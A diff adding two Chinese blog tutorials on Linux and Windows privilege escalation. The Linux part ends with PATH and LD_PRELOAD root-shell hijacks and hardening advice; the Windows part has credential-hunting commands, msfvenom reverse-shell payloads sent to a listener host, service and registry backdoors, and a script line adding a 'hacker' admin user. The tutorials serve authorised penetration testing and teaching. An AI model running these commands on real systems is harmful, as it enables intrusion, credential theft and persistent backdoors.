+<p>使用 <code>strings</code> 分析该文件，发现其调用了 <code>curl</code> 命令但未使用绝对路径：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">strings /opt/statuscheck<br></code></pre></td></tr></table></figure>
+
+<p>在 <code>/tmp</code> 目录下创建同名的恶意 <code>curl</code> 脚本，并将 <code>/tmp</code> 加入 <code>PATH</code> 环境变量前部。当程序执行 <code>curl</code> 时，会优先调用攻击者控制的版本，从而获得 root 权限的 shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; /tmp/curl<br><span class="hljs-built_in">chmod</span> +x /tmp/curl<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>/opt/statuscheck<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-2-LD-PRELOAD-提权"><a href="#6-2-LD-PRELOAD-提权" class="headerlink" title="6.2 LD_PRELOAD 提权"></a>6.2 LD_PRELOAD 提权</h3><p><strong>提权原理</strong></p>
+<p><code>LD_PRELOAD</code> 是 Linux 动态链接器的环境变量，允许用户指定在程序运行前优先加载的动态链接库（<code>.so</code> 文件）。当程序启动时，动态链接器会先加载 <code>LD_PRELOAD</code> 指定的库，从而覆盖程序原本依赖的库函数。攻击者通过劫持关键函数（如 <code>getuid</code>、<code>strcmp</code> 等），可在目标程序的高权限上下文中注入并执行任意代码。</p>
+<p><strong>利用条件</strong>：sudo 配置中设置了 <code>env_keep += LD_PRELOAD</code>（保留 LD_PRELOAD 环境变量）。</p>
+<p><strong>提权步骤</strong></p>
+<p>通过 <code>sudo -l</code> 查看当前用户无需密码即可 sudo 执行的程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">test</span> ALL=(ALL:ALL) NOPASSWD: /tmp/1.sh<br></code></pre></td></tr></table></figure>
+
+<p>编写恶意动态库，利用 <code>_init</code> 构造函数在库加载时自动执行：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> _init() &#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    setgid(<span class="hljs-number">0</span>);<br>    setuid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译为共享库后，通过 <code>LD_PRELOAD</code> 指定在 sudo 执行程序前加载该库，<code>_init</code> 函数会自动将进程 UID&#x2F;GID 设为 0 并启动 shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -fPIC -shared -o shell.so shell.c -nostartfiles<br><span class="hljs-built_in">sudo</span> LD_PRELOAD=/tmp/shell.so /tmp/1.sh<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、自动化提权工具"><a href="#七、自动化提权工具" class="headerlink" title="七、自动化提权工具"></a>七、自动化提权工具</h2><p>手动检查容易遗漏，自动化工具可系统性扫描提权面。实际渗透中通常组合使用多个工具以提高覆盖率。</p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>功能</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>LinPEAS</strong></td>
+<td>全面枚举，颜色高亮风险项</td>
+<td>首次全面检查（推荐）</td>
+</tr>
+<tr>
+<td><strong>LinEnum</strong></td>
+<td>系统信息 + 常见提权向量</td>
+<td>快速扫描</td>
+</tr>
+<tr>
+<td><strong>linux-exploit-suggester</strong></td>
+<td>内核漏洞比对</td>
+<td>内核提权识别</td>
+</tr>
+<tr>
+<td><strong>pspy</strong></td>
+<td>无需 root 监控进程</td>
+<td>发现 cron 任务和后台进程</td>
+</tr>
+<tr>
+<td><strong>lse</strong></td>
+<td>Linux Smart Enumeration</td>
+<td>结构化报告</td>
+</tr>
+<tr>
+<td><strong>PrivEsc</strong></td>
+<td>多向量检测</td>
+<td>综合扫描</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="八、防御与缓解"><a href="#八、防御与缓解" class="headerlink" title="八、防御与缓解"></a>八、防御与缓解</h2><h3 id="8-1-最小权限原则"><a href="#8-1-最小权限原则" class="headerlink" title="8.1 最小权限原则"></a>8.1 最小权限原则</h3><ul>
+<li>服务账户使用最小权限，避免不必要的 sudo 规则</li>
+<li>Web 服务（www-data、nginx）不加入特权组</li>
+<li>谨慎授予 <code>NOPASSWD</code> sudo 规则，禁止通配符命令</li>
+<li>定期审计 <code>/etc/sudoers</code> 和 <code>/etc/sudoers.d/</code></li>
+</ul>
+<h3 id="8-2-SUID-与-Capability-加固"><a href="#8-2-SUID-与-Capability-加固" class="headerlink" title="8.2 SUID 与 Capability 加固"></a>8.2 SUID 与 Capability 加固</h3><ul>
+<li>定期扫描 SUID 文件，与基线对比：<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -4000 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">ls</span> &gt; /tmp/suid_baseline.txt<br></code></pre></td></tr></table></figure></li>
+<li>移除不必要的 SUID 位（<code>chmod u-s</code>）</li>
+<li>审计 capabilities 分配，仅对必要程序授予</li>
+<li>禁用不必要的 <code>setcap</code> 权限</li>
+</ul>
+<h3 id="8-3-Cron-与服务加固"><a href="#8-3-Cron-与服务加固" class="headerlink" title="8.3 Cron 与服务加固"></a>8.3 Cron 与服务加固</h3><ul>
+<li>cron 脚本使用绝对路径</li>
+<li>cron 脚本权限设为 <code>700</code>，仅 root 可写</li>
+<li>避免在 cron 中使用通配符（<code>*</code>）</li>
+<li>NFS 挂载禁用 <code>no_root_squash</code>，使用 <code>root_squash</code></li>
+<li>MySQL 不以 root 身份运行，限制 <code>secure_file_priv</code></li>
+</ul>
+<h3 id="8-4-内核与补丁管理"><a href="#8-4-内核与补丁管理" class="headerlink" title="8.4 内核与补丁管理"></a>8.4 内核与补丁管理</h3><ul>
+<li>保持内核版本最新，关注本地提权 CVE</li>
+<li>使用 <code>unattended-upgrades</code> 自动安装安全补丁</li>
+<li>容器环境也需更新内核（不要依赖容器隔离）</li>
+<li>高风险服务器建立快速回滚机制</li>
+</ul>
+<h3 id="8-5-监控审计"><a href="#8-5-监控审计" class="headerlink" title="8.5 监控审计"></a>8.5 监控审计</h3><ul>
+<li>配置 auditd 审计 SUID 执行和 sudo 使用</li>
+<li>监控 <code>/etc/passwd</code>、<code>/etc/shadow</code>、<code>/etc/sudoers</code> 修改</li>
+<li>使用 AIDE &#x2F; Ossec 做文件完整性监控</li>
+<li>集中收集日志，配置异常告警</li>
+</ul>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Linux 提权是一个多层次的技术体系，实战中遵循以下方法论：</p>
+<ol>
+<li><strong>先收集，再利用</strong> — <code>id</code>、<code>uname -a</code>、<code>sudo -l</code> + LinPEAS 全面收集</li>
+<li><strong>内核优先</strong> — 使用 linux-exploit-suggester 识别漏洞，选择稳定 Exploit</li>
+<li><strong>配置兜底</strong> — 补丁完善时重点查 SUID 程序、Cron 任务、服务权限、NFS 配置</li>
+<li><strong>特权利用</strong> — <code>sudo -l</code> 有可滥用程序查 GTFOBins，<code>getcap</code> 有危险 capability 则直接提权</li>
+<li><strong>环境劫持</strong> — PATH 劫持和 LD_PRELOAD 劫持利用程序环境缺陷</li>
+<li><strong>服务逃逸</strong> — MySQL UDF、LXD 容器逃逸利用高权限服务</li>
+</ol>
+<p>防御核心是<strong>最小权限原则</strong>和<strong>配置加固</strong>：定期审计 SUID&#x2F;Capability&#x2F;sudo 规则、保持内核补丁更新、部署文件完整性监控，可有效收敛提权攻击面。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><strong>GTFOBins</strong> — Unix&#x2F;Linux 二进制提权速查库
+<a href="https://gtfobins.org/">https://gtfobins.org/</a></li>
+<li><strong>LinPEAS (PEASS-ng)</strong>  — Linux 自动化权限枚举工具
+<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></li>
+<li><strong>HackTricks — Linux Local Privilege Escalation</strong> — 最全面的 Linux 提权技术 Wiki
+<a href="https://book.hacktricks.wiki/linux-hardening/privilege-escalation/">https://book.hacktricks.wiki/linux-hardening/privilege-escalation/</a></li>
+<li><strong>PayloadsAllTheThings — Linux Privilege Escalation</strong> — 提权方法与命令速查
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li>
+<li><strong>linux-exploit-suggester</strong> — 内核漏洞检测脚本
+<a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></li>
+<li><strong>LinEnum</strong> — Linux 枚举工具
+<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
+<li><strong>pspy</strong> — 无需 root 的进程监控工具
+<a href="https://github.com/dominicbreuker/pspy">https://github.com/dominicbreuker/pspy</a></li>
+<li><strong>NIST SP 800-61 Rev.3</strong> — 应急响应官方框架
+<a href="https://csrc.nist.gov/pubs/sp/800/61/r3/final">https://csrc.nist.gov/pubs/sp/800/61/r3/final</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>技术杂项</category>
+      </categories>
+      <tags>
+        <tag>技术杂项</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows提权小结</title>
+    <url>/2026/08/23/Windows%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<blockquote>
+<p>本文仅供安全研究、授权渗透测试、CTF 竞赛与防御教学使用。未经授权对他人系统实施提权攻击属于违法行为。</p>
+</blockquote>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Windows 提权（Privilege Escalation）是渗透测试中的核心环节。攻击者获得初始 foothold 后通常只有低权限 shell，需要将权限提升到 <strong>NT AUTHORITY\SYSTEM</strong> 或本地管理员才能实现凭据窃取、横向移动和持久化控制。</p>
+<p>本文将 Windows 提权技术分为六大类，按<strong>内核漏洞 → 配置错误 → 特权滥用 → UAC 绕过 → 凭据窃取 → 域环境</strong>的逻辑展开，力求分类清晰、覆盖全面。</p>
+<hr>
+<h2 id="一、Windows-权限体系基础"><a href="#一、Windows-权限体系基础" class="headerlink" title="一、Windows 权限体系基础"></a>一、Windows 权限体系基础</h2><p>理解提权的前提是理解 Windows 的权限模型。</p>
+<h3 id="1-1-用户角色"><a href="#1-1-用户角色" class="headerlink" title="1.1 用户角色"></a>1.1 用户角色</h3><table>
+<thead>
+<tr>
+<th>角色</th>
+<th>权限级别</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>SYSTEM</strong></td>
+<td>最高</td>
+<td>内核级身份，提权的终极目标</td>
+</tr>
+<tr>
+<td><strong>Administrator</strong></td>
+<td>高</td>
+<td>本地管理员，受 UAC 约束</td>
+</tr>
+<tr>
+<td><strong>标准用户</strong></td>
+<td>中</td>
+<td>受 UAC、完整性级别和 ACL 限制</td>
+</tr>
+<tr>
+<td>Network Service</td>
+<td>低</td>
+<td>网络服务账户</td>
+</tr>
+<tr>
+<td>Local Service</td>
+<td>低</td>
+<td>本地服务账户</td>
+</tr>
+</tbody></table>
+<h3 id="1-2-完整性级别（Integrity-Level）"><a href="#1-2-完整性级别（Integrity-Level）" class="headerlink" title="1.2 完整性级别（Integrity Level）"></a>1.2 完整性级别（Integrity Level）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">System (0x4000) — NT AUTHORITY\SYSTEM<br>High   (0x3000) — Elevated administrator<br>Medium (0x2000) — Standard non-admin user<br>Low    (0x1000) — Sandboxed processes<br></code></pre></td></tr></table></figure>
+
+<p>Medium Integrity 进程无法向 High Integrity 进程写入内存或打开其令牌。</p>
+<h3 id="1-3-UAC-机制"><a href="#1-3-UAC-机制" class="headerlink" title="1.3 UAC 机制"></a>1.3 UAC 机制</h3><p>管理员登录时 Windows 创建两个令牌：</p>
+<ul>
+<li><strong>Filtered Token</strong>（中等完整性）— 日常操作使用</li>
+<li><strong>Full Token</strong>（高完整性）— 需要提升时使用</li>
+</ul>
+<blockquote>
+<p>UAC 不是安全边界（Security Boundary），微软多次声明其设计目标是提醒管理员，而非阻止恶意代码。</p>
+</blockquote>
+<h3 id="1-4-关键特权"><a href="#1-4-关键特权" class="headerlink" title="1.4 关键特权"></a>1.4 关键特权</h3><p>通过 <code>whoami /priv</code> 查看，以下特权可被滥用：</p>
+<table>
+<thead>
+<tr>
+<th>特权</th>
+<th>提权方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>SeImpersonatePrivilege</strong></td>
+<td>Potato 系列攻击，模拟 SYSTEM 令牌</td>
+</tr>
+<tr>
+<td><strong>SeDebugPrivilege</strong></td>
+<td>附加高权限进程、窃取令牌</td>
+</tr>
+<tr>
+<td><strong>SeBackupPrivilege</strong></td>
+<td>读取 SAM&#x2F;SYSTEM 数据库</td>
+</tr>
+<tr>
+<td><strong>SeRestorePrivilege</strong></td>
+<td>覆盖系统文件或 DLL 劫持</td>
+</tr>
+<tr>
+<td><strong>SeTakeOwnershipPrivilege</strong></td>
+<td>接管文件&#x2F;注册表所有权后修改权限</td>
+</tr>
+<tr>
+<td><strong>SeLoadDriverPrivilege</strong></td>
+<td>加载恶意驱动执行内核代码</td>
+</tr>
+<tr>
+<td><strong>SeAssignPrimaryTokenPrivilege</strong></td>
+<td>与 SeImpersonate 配合替换进程令牌</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>IIS 应用池、SQL Server、WinRM、Exchange 等服务账户默认拥有 SeImpersonatePrivilege，是 Potato 攻击的高频目标。</p>
+</blockquote>
+<hr>
+<h2 id="二、提权前置：信息收集"><a href="#二、提权前置：信息收集" class="headerlink" title="二、提权前置：信息收集"></a>二、提权前置：信息收集</h2><p>信息收集决定后续攻击方向，是提权的第一步。</p>
+<h3 id="2-1-系统信息"><a href="#2-1-系统信息" class="headerlink" title="2.1 系统信息"></a>2.1 系统信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 系统信息</span><br>systeminfo<br>hostname<br><br><span class="hljs-comment"># 网络配置</span><br>ipconfig /all<br>netstat -ano<br><br><span class="hljs-comment"># 已安装补丁（关键！）</span><br>wmic qfe get Caption,Description,HotFixID,InstalledOn<br><span class="hljs-comment"># PowerShell</span><br>Get-HotFix | Sort-Object InstalledOn -Descending<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-2-用户与权限"><a href="#2-2-用户与权限" class="headerlink" title="2.2 用户与权限"></a>2.2 用户与权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all          <span class="hljs-comment"># 完整信息</span><br><span class="hljs-built_in">whoami</span> /priv         <span class="hljs-comment"># 当前特权（关键！）</span><br><span class="hljs-built_in">whoami</span> /groups       <span class="hljs-comment"># 用户所属组</span><br>net user             <span class="hljs-comment"># 所有本地用户</span><br>net localgroup Administrators  <span class="hljs-comment"># 管理员组成员</span><br>net user /domain     <span class="hljs-comment"># 域用户</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-3-服务与计划任务"><a href="#2-3-服务与计划任务" class="headerlink" title="2.3 服务与计划任务"></a>2.3 服务与计划任务</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sc query             <span class="hljs-comment"># 所有服务</span><br>tasklist /svc        <span class="hljs-comment"># 服务及 PID</span><br>wmic service list brief<br>schtasks /query /fo LIST /v  <span class="hljs-comment"># 计划任务</span><br>wmic product get name, version, vendor  <span class="hljs-comment"># 已安装软件</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-4-凭据搜索"><a href="#2-4-凭据搜索" class="headerlink" title="2.4 凭据搜索"></a>2.4 凭据搜索</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 搜索包含密码的文件</span><br>findstr /si <span class="hljs-string">&quot;password&quot;</span> *.txt *.ini *.config *.xml 2&gt;nul<br><br><span class="hljs-comment"># Unattend 安装文件</span><br><span class="hljs-built_in">dir</span> /b /s C:\Windows\Panther\unattend.xml 2&gt;nul<br><br><span class="hljs-comment"># PowerShell 历史</span><br><span class="hljs-built_in">type</span> %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br><br><span class="hljs-comment"># 凭据管理器</span><br>cmdkey /list<br><br><span class="hljs-comment"># AutoLogon 密码</span><br>reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultPassword<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>发现保存的凭据后，可尝试 <code>runas /savecred /user:DOMAIN\user cmd.exe</code> 以该用户身份执行命令。</p>
+</blockquote>
+<hr>
+<h2 id="三、内核漏洞提权"><a href="#三、内核漏洞提权" class="headerlink" title="三、内核漏洞提权"></a>三、内核漏洞提权</h2><p>利用未打补丁的 Windows 内核漏洞，通过令牌窃取实现 SYSTEM 提权。这是最直接的路径，但可能导致蓝屏。</p>
+<h3 id="3-1-常见-CVE"><a href="#3-1-常见-CVE" class="headerlink" title="3.1 常见 CVE"></a>3.1 常见 CVE</h3><table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>补丁编号</th>
+<th>漏洞描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MS16-032</td>
+<td>KB3139914</td>
+<td>Secondary Logon 竞争条件</td>
+</tr>
+<tr>
+<td>MS16-135</td>
+<td>KB3199135</td>
+<td>内核模式驱动内存处理不当</td>
+</tr>
+<tr>
+<td>CVE-2018-8120</td>
+<td>KB4103727</td>
+<td>Win32k 本地提权</td>
+</tr>
+<tr>
+<td>CVE-2019-1458</td>
+<td>KB4512534</td>
+<td>Win32k 提权，影响 Win10&#x2F;Server 2019</td>
+</tr>
+<tr>
+<td>CVE-2020-0787</td>
+<td>KB4556800</td>
+<td>BITS 服务本地提权</td>
+</tr>
+<tr>
+<td>CVE-2021-1732</td>
+<td>KB5001401</td>
+<td>Win32k 窗口对象类型混淆越界写入</td>
+</tr>
+<tr>
+<td>CVE-2022-37969</td>
+<td>KB5014697</td>
+<td>UWP 本地提权</td>
+</tr>
+<tr>
+<td>CVE-2024-21338</td>
+<td>多个</td>
+<td>appid.sys 驱动 IOCTL 处理不当</td>
+</tr>
+</tbody></table>
+<h3 id="3-2-令牌窃取原理"><a href="#3-2-令牌窃取原理" class="headerlink" title="3.2 令牌窃取原理"></a>3.2 令牌窃取原理</h3><p>内核漏洞利用的核心是<strong>令牌窃取</strong>（Token Stealing）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. 通过内核读写原语找到 SYSTEM 进程的 EPROCESS<br>2. 遍历 ActiveProcessLinks 链表定位 PID 4（System 进程）<br>3. 获取 System 进程的 Token<br>4. 将当前进程的 Token 替换为 System Token<br>5. 当前进程获得 SYSTEM 权限<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 伪代码示意</span><br>EPROCESS *system_eprocess = FindSystemProcess();<br>HANDLE system_token = system_eprocess-&gt;Token;<br>current_eprocess-&gt;Token = system_token;  <span class="hljs-comment">// 替换令牌</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-3-漏洞检测工具"><a href="#3-3-漏洞检测工具" class="headerlink" title="3.3 漏洞检测工具"></a>3.3 漏洞检测工具</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>语言</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Watson</strong></td>
+<td>C#</td>
+<td>扫描补丁与漏洞数据库，列出可利用漏洞</td>
+</tr>
+<tr>
+<td><strong>Windows Exploit Suggester</strong></td>
+<td>Python</td>
+<td>systeminfo 与漏洞库匹配，标记公开 Exploit</td>
+</tr>
+<tr>
+<td><strong>Sherlock</strong></td>
+<td>PowerShell</td>
+<td>快速检测已知提权漏洞</td>
+</tr>
+</tbody></table>
+<p>WES 典型工作流：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 获取系统信息</span><br>systeminfo &gt; systeminfo.txt<br><br><span class="hljs-comment"># 2. 更新数据库</span><br>python windows-exploit-suggester.py --update<br><br><span class="hljs-comment"># 3. 扫描匹配</span><br>python windows-exploit-suggester.py --systeminfo systeminfo.txt<br><br><span class="hljs-comment"># 4. 搜索 Exploit</span><br>searchsploit CVE-2021-1732<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>内核 Exploit 可能导致蓝屏，生产环境需谨慎。务必先确认系统版本、位数和补丁状态。</p>
+</blockquote>
+<hr>
+<h2 id="四、配置错误提权"><a href="#四、配置错误提权" class="headerlink" title="四、配置错误提权"></a>四、配置错误提权</h2><p>配置错误提权不依赖未修补漏洞，而是利用管理员配置不当。在补丁完善的系统上同样有效，是实际渗透中最常见的提权路径。</p>
+<h3 id="4-1-未引用服务路径（Unquoted-Service-Path）"><a href="#4-1-未引用服务路径（Unquoted-Service-Path）" class="headerlink" title="4.1 未引用服务路径（Unquoted Service Path）"></a>4.1 未引用服务路径（Unquoted Service Path）</h3><p>服务二进制路径含空格且未加引号时，Windows 按空格逐段解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">路径: C:\Program Files\Inventory Service\svc.exe<br>解析顺序:<br>  1. C:\Program.exe<br>  2. C:\Program Files\Inventory.exe<br>  3. C:\Program Files\Inventory Service\svc.exe (正确路径)<br></code></pre></td></tr></table></figure>
+
+<p>攻击者在可写分段位置放置恶意 exe 即可以 SYSTEM 权限执行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查找未引用路径服务</span><br>wmic service get name,displayname,pathname,startmode | findstr /i <span class="hljs-string">&quot;auto&quot;</span> | findstr /iv <span class="hljs-string">&quot;c:\windows&quot;</span> | findstr /iv <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 检查路径可写性</span><br><span class="hljs-string">accesschk.exe /accepteula -uwdq &quot;</span>C:\Program Files\Inventory Service<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 生成恶意 exe</span><br><span class="hljs-string">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o &quot;</span>C:\Program.exe<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 触发</span><br><span class="hljs-string">sc stop &quot;</span>ServiceName<span class="hljs-string">&quot; &amp;&amp; sc start &quot;</span>ServiceName<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-2-服务权限配置错误"><a href="#4-2-服务权限配置错误" class="headerlink" title="4.2 服务权限配置错误"></a>4.2 服务权限配置错误</h3><p>当前用户对服务二进制或服务配置有写权限时，可直接替换或修改：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检查谁可以修改服务</span><br>accesschk.exe -accepteula -ucqv <span class="hljs-string">&quot;Users&quot;</span> *<br><br><span class="hljs-comment"># 方法一：替换二进制</span><br>copy evil.exe <span class="hljs-string">&quot;C:\Program Files\App\service.exe&quot;</span><br>sc stop <span class="hljs-string">&quot;ServiceName&quot;</span> &amp;&amp; sc start <span class="hljs-string">&quot;ServiceName&quot;</span><br><br><span class="hljs-comment"># 方法二：修改 binPath（需 SERVICE_CHANGE_CONFIG）</span><br>sc config <span class="hljs-string">&quot;ServiceName&quot;</span> binpath= <span class="hljs-string">&quot;C:\evil\backdoor.exe&quot;</span><br>sc start <span class="hljs-string">&quot;ServiceName&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>PowerUp 自动化检测与利用：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\PowerUp.ps1<br><span class="hljs-built_in">Get-ServiceUnquoted</span>      <span class="hljs-comment"># 未引用路径</span><br><span class="hljs-built_in">Get-ServiceEXEPerms</span>      <span class="hljs-comment"># 二进制可写</span><br><span class="hljs-built_in">Get-ServicePerms</span>         <span class="hljs-comment"># 可修改配置</span><br><span class="hljs-built_in">Invoke-ServiceAbuse</span> <span class="hljs-literal">-ServiceName</span> <span class="hljs-string">&quot;VulnSVC&quot;</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;cmd.exe /c whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-3-AlwaysInstallElevated"><a href="#4-3-AlwaysInstallElevated" class="headerlink" title="4.3 AlwaysInstallElevated"></a>4.3 AlwaysInstallElevated</h3><p>组策略允许非管理员以 SYSTEM 权限运行 MSI 包。以下两个注册表键<strong>同时为 1</strong> 时可利用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检测</span><br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br><br><span class="hljs-comment"># 生成恶意 MSI</span><br>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi<br><br><span class="hljs-comment"># 安装（以 SYSTEM 执行）</span><br>msiexec /quiet /qn /i evil.msi<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-4-注册表权限错误"><a href="#4-4-注册表权限错误" class="headerlink" title="4.4 注册表权限错误"></a>4.4 注册表权限错误</h3><p>对自启动项或服务注册表项有写权限时，可植入恶意程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检查自启动项</span><br>reg query <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><br><br><span class="hljs-comment"># 检查服务注册表权限</span><br>accesschk.exe -accepteula -k <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\ServiceName&quot;</span><br><br><span class="hljs-comment"># 修改服务 ImagePath</span><br>reg add <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\ServiceName&quot;</span> /v ImagePath /t REG_EXPAND_SZ /d <span class="hljs-string">&quot;C:\evil.exe&quot;</span> /f<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-5-计划任务提权"><a href="#4-5-计划任务提权" class="headerlink" title="4.5 计划任务提权"></a>4.5 计划任务提权</h3><p>计划任务常以 SYSTEM 运行。如果任务脚本可被修改，即可劫持：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出计划任务</span><br>schtasks /query /fo LIST /v<br><br><span class="hljs-comment"># 检查脚本权限</span><br>icacls <span class="hljs-string">&quot;C:\Scripts\backup.bat&quot;</span><br><br><span class="hljs-comment"># 追加恶意命令</span><br><span class="hljs-built_in">echo</span> net user hacker P@ssw0rd123 /add &gt;&gt; C:\Scripts\backup.bat<br><br><span class="hljs-comment"># 手动触发</span><br>schtasks /run /tn <span class="hljs-string">&quot;TaskName&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-6-DLL-劫持"><a href="#4-6-DLL-劫持" class="headerlink" title="4.6 DLL 劫持"></a>4.6 DLL 劫持</h3><p>Windows DLL 搜索顺序：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. 可执行文件所在目录<br>2. C:\Windows\System32<br>3. C:\Windows<br>4. PATH 环境变量中的目录<br>5. ...<br></code></pre></td></tr></table></figure>
+
+<p>如果搜索路径中包含可写目录，攻击者放置同名恶意 DLL 即可被优先加载。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检查 PATH 中可写目录</span><br>accesschk.exe /accepteula -uwdq <span class="hljs-string">&quot;%PATH%&quot;</span><br><br><span class="hljs-comment"># PowerUp 检测</span><br>Find-PathDLLHijack<br></code></pre></td></tr></table></figure>
+
+<p>使用 <strong>Procmon</strong> 监控 DLL 加载：设置过滤器 <code>Result = NAME NOT FOUND</code> 且 <code>Path 以 .dll 结尾</code>，可发现程序尝试加载但找不到的 DLL。</p>
+<h3 id="4-7-其他配置错误"><a href="#4-7-其他配置错误" class="headerlink" title="4.7 其他配置错误"></a>4.7 其他配置错误</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>AutoLogon 凭据</strong></td>
+<td>注册表 <code>Winlogon\DefaultPassword</code> 明文存储管理员密码</td>
+</tr>
+<tr>
+<td><strong>Unattend 文件</strong></td>
+<td>无人值守安装文件含 Base64 编码的管理员密码</td>
+</tr>
+<tr>
+<td><strong>PowerShell 历史</strong></td>
+<td><code>ConsoleHost_history.txt</code> 中可能记录含密码的命令</td>
+</tr>
+<tr>
